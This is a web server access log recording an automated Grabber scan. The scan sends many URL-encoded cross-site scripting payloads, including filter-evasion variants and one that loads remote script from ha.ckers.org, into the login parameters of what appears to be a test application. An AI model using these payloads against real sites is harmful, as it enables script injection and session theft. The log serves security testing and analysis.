172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /?username=%3CIMG+SRC%3D%22+%26%2314%3B+javascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=%3CIMG+SRC%3D%22+%26%2314%3B+javascript%3Aalert%28%27XSS%27%29%3B%22%3E&Login=%3CIMG+SRC%3D%22+%26%2314%3B+javascript%3Aalert%28%27XSS%27%29%3B%22%3E&password=%3CIMG+SRC%3D%22+%26%2314%3B+javascript%3Aalert%28%27XSS%27%29%3B%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /?username=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E&Login=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E&password=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /?username=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E&user_token=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E&Login=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E&password=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /?username=%3CIMG+SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=%3CIMG+SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&Login=%3CIMG+SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&password=%3CIMG+SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /?username=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E&user_token=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E&Login=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E&password=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2Fwww.gohttp%3A%2F%2Fwww.google.com%2Fogle.com%2F%22%3EXSS%3C%2FA%3E&user_token=%3CA+HREF%3D%22http%3A%2F%2Fwww.gohttp%3A%2F%2Fwww.google.com%2Fogle.com%2F%22%3EXSS%3C%2FA%3E&Login=%3CA+HREF%3D%22http%3A%2F%2Fwww.gohttp%3A%2F%2Fwww.google.com%2Fogle.com%2F%22%3EXSS%3C%2FA%3E&password=%3CA+HREF%3D%22http%3A%2F%2Fwww.gohttp%3A%2F%2Fwww.google.com%2Fogle.com%2F%22%3EXSS%3C%2FA%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /?username=%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%3CIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Aalert%28%27XSS%27%29%22%3E%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E&user_token=%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%3CIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Aalert%28%27XSS%27%29%22%3E%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E&Login=%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%3CIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Aalert%28%27XSS%27%29%22%3E%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E&password=%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%3CIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Aalert%28%27XSS%27%29%22%3E%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2Fwww.google.com.%2F%22%3EXSS%3C%2FA%3E&user_token=%3CA+HREF%3D%22http%3A%2F%2Fwww.google.com.%2F%22%3EXSS%3C%2FA%3E&Login=%3CA+HREF%3D%22http%3A%2F%2Fwww.google.com.%2F%22%3EXSS%3C%2FA%3E&password=%3CA+HREF%3D%22http%3A%2F%2Fwww.google.com.%2F%22%3EXSS%3C%2FA%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /?username=%3CSCRIPT%2FXSS+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&user_token=%3CSCRIPT%2FXSS+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&Login=%3CSCRIPT%2FXSS+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&password=%3CSCRIPT%2FXSS+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /?username=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F&user_token=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F&Login=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F&password=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2Fgoogle.com%2F%22%3EXSS%3C%2FA%3E&user_token=%3CA+HREF%3D%22http%3A%2F%2Fgoogle.com%2F%22%3EXSS%3C%2FA%3E&Login=%3CA+HREF%3D%22http%3A%2F%2Fgoogle.com%2F%22%3EXSS%3C%2FA%3E&password=%3CA+HREF%3D%22http%3A%2F%2Fgoogle.com%2F%22%3EXSS%3C%2FA%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /?username=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&Login=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&password=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /?username=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&Login=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&password=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /?username=%3CSCRIPT%3Ea%3D%2FXSS%2F+alert%28a.source%29%3C%2FSCRIPT%3E&user_token=%3CSCRIPT%3Ea%3D%2FXSS%2F+alert%28a.source%29%3C%2FSCRIPT%3E&Login=%3CSCRIPT%3Ea%3D%2FXSS%2F+alert%28a.source%29%3C%2FSCRIPT%3E&password=%3CSCRIPT%3Ea%3D%2FXSS%2F+alert%28a.source%29%3C%2FSCRIPT%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /?username=perl+-e+%27print+%22%3CIMG+SRC%3Djava%00script%3Aalert%28%22XSS%22%29%3E%22%3B%27%3E+out&user_token=perl+-e+%27print+%22%3CIMG+SRC%3Djava%00script%3Aalert%28%22XSS%22%29%3E%22%3B%27%3E+out&Login=perl+-e+%27print+%22%3CIMG+SRC%3Djava%00script%3Aalert%28%22XSS%22%29%3E%22%3B%27%3E+out&password=perl+-e+%27print+%22%3CIMG+SRC%3Djava%00script%3Aalert%28%22XSS%22%29%3E%22%3B%27%3E+out& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /?username=perl+-e+%27print+%22%26%3CSCR%00IPT%3Ealert%28%22XSS%22%29%3C%2FSCR%00IPT%3E%22%3B%27+%3E+out&user_token=perl+-e+%27print+%22%26%3CSCR%00IPT%3Ealert%28%22XSS%22%29%3C%2FSCR%00IPT%3E%22%3B%27+%3E+out&Login=perl+-e+%27print+%22%26%3CSCR%00IPT%3Ealert%28%22XSS%22%29%3C%2FSCR%00IPT%3E%22%3B%27+%3E+out&password=perl+-e+%27print+%22%26%3CSCR%00IPT%3Ealert%28%22XSS%22%29%3C%2FSCR%00IPT%3E%22%3B%27+%3E+out& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /?username=%3CBODY+onload%21%23%24%25%26%28%29%2A%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E&user_token=%3CBODY+onload%21%23%24%25%26%28%29%2A%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E&Login=%3CBODY+onload%21%23%24%25%26%28%29%2A%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E&password=%3CBODY+onload%21%23%24%25%26%28%29%2A%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:02 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /?username=%3CDIV+STYLE%3D%22background-image%3A%00075%00072%0006C%00028%27%0006a%00061%00076%00061%00073%00063%00072%00069%00070%00074%0003a%00061%0006c%00065%00072%00074%00028.1027%00058.1053%00053%00027%00029%27%00029%22%3E&user_token=%3CDIV+STYLE%3D%22background-image%3A%00075%00072%0006C%00028%27%0006a%00061%00076%00061%00073%00063%00072%00069%00070%00074%0003a%00061%0006c%00065%00072%00074%00028.1027%00058.1053%00053%00027%00029%27%00029%22%3E&Login=%3CDIV+STYLE%3D%22background-image%3A%00075%00072%0006C%00028%27%0006a%00061%00076%00061%00073%00063%00072%00069%00070%00074%0003a%00061%0006c%00065%00072%00074%00028.1027%00058.1053%00053%00027%00029%27%00029%22%3E&password=%3CDIV+STYLE%3D%22background-image%3A%00075%00072%0006C%00028%27%0006a%00061%00076%00061%00073%00063%00072%00069%00070%00074%0003a%00061%0006c%00065%00072%00074%00028.1027%00058.1053%00053%00027%00029%27%00029%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /?username=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E&user_token=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E&Login=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E&password=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /?username=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E&user_token=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E&Login=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E&password=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /?username=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E&user_token=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E&Login=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E&password=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /?username=%3CMETA+HTTP-EQUIV%3D%22Set-Cookie%22+Content%3D%22USERID%3D%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E&user_token=%3CMETA+HTTP-EQUIV%3D%22Set-Cookie%22+Content%3D%22USERID%3D%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E&Login=%3CMETA+HTTP-EQUIV%3D%22Set-Cookie%22+Content%3D%22USERID%3D%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E&password=%3CMETA+HTTP-EQUIV%3D%22Set-Cookie%22+Content%3D%22USERID%3D%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /?username=%3CSTYLE+TYPE%3D%22text%2Fjavascript%22%3Ealert%28%27XSS%27%29%3B%3C%2FSTYLE%3E&user_token=%3CSTYLE+TYPE%3D%22text%2Fjavascript%22%3Ealert%28%27XSS%27%29%3B%3C%2FSTYLE%3E&Login=%3CSTYLE+TYPE%3D%22text%2Fjavascript%22%3Ealert%28%27XSS%27%29%3B%3C%2FSTYLE%3E&password=%3CSTYLE+TYPE%3D%22text%2Fjavascript%22%3Ealert%28%27XSS%27%29%3B%3C%2FSTYLE%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /?username=%3C%21--%5Bif+gte+IE+4%5D%3E+%3CSCRIPT%3Ealert%28%27XSS%27%29%3B%3C%2FSCRIPT%3E+%3C%21%5Bendif%5D--%3E&user_token=%3C%21--%5Bif+gte+IE+4%5D%3E+%3CSCRIPT%3Ealert%28%27XSS%27%29%3B%3C%2FSCRIPT%3E+%3C%21%5Bendif%5D--%3E&Login=%3C%21--%5Bif+gte+IE+4%5D%3E+%3CSCRIPT%3Ealert%28%27XSS%27%29%3B%3C%2FSCRIPT%3E+%3C%21%5Bendif%5D--%3E&password=%3C%21--%5Bif+gte+IE+4%5D%3E+%3CSCRIPT%3Ealert%28%27XSS%27%29%3B%3C%2FSCRIPT%3E+%3C%21%5Bendif%5D--%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /?username=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E&user_token=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E&Login=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E&password=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2Fha.ckers.org%40google%22%3EXSS%3C%2FA%3E&user_token=%3CA+HREF%3D%22http%3A%2F%2Fha.ckers.org%40google%22%3EXSS%3C%2FA%3E&Login=%3CA+HREF%3D%22http%3A%2F%2Fha.ckers.org%40google%22%3EXSS%3C%2FA%3E&password=%3CA+HREF%3D%22http%3A%2F%2Fha.ckers.org%40google%22%3EXSS%3C%2FA%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /?username=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E&user_token=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E&Login=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E&password=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /?username=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E&user_token=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E&Login=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E&password=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /?username=%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E&user_token=%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E&Login=%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E&password=%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /?username=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4-&user_token=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4-&Login=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4-&password=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4-& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
